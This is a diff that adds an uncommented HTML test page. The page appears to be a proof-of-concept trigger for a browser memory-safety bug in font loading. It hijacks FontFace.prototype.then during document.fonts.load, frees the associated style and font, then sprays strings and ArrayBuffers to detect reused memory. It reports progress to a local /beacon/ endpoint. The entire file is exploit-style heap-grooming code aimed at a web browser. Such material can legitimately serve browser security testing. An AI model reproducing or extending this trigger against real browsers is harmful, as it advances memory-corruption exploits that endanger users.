@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>late</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+</script>
+<script>
+(function(){
+  var victim = null;
+  function run(){
+    b('LT-START');
+    var A = new FontFace('a','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A); void A.loaded;
+    var st = document.createElement('style');
+    st.id='victim-style';
+    st.textContent="@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
+    document.head.appendChild(st);
+    var fired=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if (fired) return undefined;
+        fired=true;
+        b('LT-GET');
+        var v=document.getElementById('victim-style'); if(v) v.remove();
+        try{ document.fonts.delete(this); }catch(e){}
+        document.body.offsetHeight;
+        var arr=new Array(128).fill("\u4141");
+        victim = arr.join("");
+        b('LT-VICTIM-' + victim.length + '-' + victim.charCodeAt(0).toString(16));
+        return undefined;
+      },
+      set:function(){}
+    });
+    b('LT-LOAD');
+    document.fonts.load('1em a, x','AB').then(
+      function(){ b('LT-RES'); post(); },
+      function(){ b('LT-REJ'); post(); }
+    );
+  }
+  function post(){
+    setTimeout(function(){
+      b('LT-PRE-SPRAY-c0-' + victim.charCodeAt(0).toString(16));
+      var bufs=[], views=[];
+      for (var i=0;i<600;i++){ var ab=new ArrayBuffer(274); bufs.push(ab); views.push(new Uint8Array(ab)); }
+      for (var j=0;j<views.length;j++){ var w=views[j]; for (var k=0;k<w.length;k++) w[k]=0xBB; }
+      b('LT-FILLED');
+      var c0 = victim.charCodeAt(0).toString(16);
+      var dup=-1;
+      for (var q=0;q<views.length;q++){ if (views[q][0] !== 0xBB) { dup=q; break; } }
+      b('LT-POST-c0-' + c0 + '-dup' + dup);
+      b('LT-DONE');
+    }, 250);
+  }
+  if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+  else document.addEventListener('DOMContentLoaded',run);
+})();
+</script>
+</head><body><p>late</p></body></html>
